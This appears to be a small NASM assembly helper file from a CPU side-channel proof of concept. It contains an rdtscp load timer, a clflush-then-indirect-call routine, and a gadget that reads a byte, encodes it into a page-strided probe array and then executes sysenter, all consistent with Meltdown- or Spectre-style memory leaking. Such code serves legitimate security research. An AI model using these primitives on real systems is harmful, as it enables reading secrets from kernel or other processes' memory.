BITS 64

global memory_access
global indirect_call
global touch_and_break

section .text

memory_access:
  mov r9, rcx

  rdtscp
  shl rdx, 20h
  or rax, rdx
  mov r8, rax

  mov rax, [r9]

  rdtscp
  shl rdx, 20h
  or rax, rdx

  sub rax,r8
  ret

indirect_call:
  mov rax, rcx
  mov rcx, rdx
  mov rdx, r8
  clflush [rax]
  call [rax]
  ret

touch_and_break:
  movzx eax, byte [rcx]
  shl rax, 0Ch
  mov al, byte [rax+rdx]
  sysenter
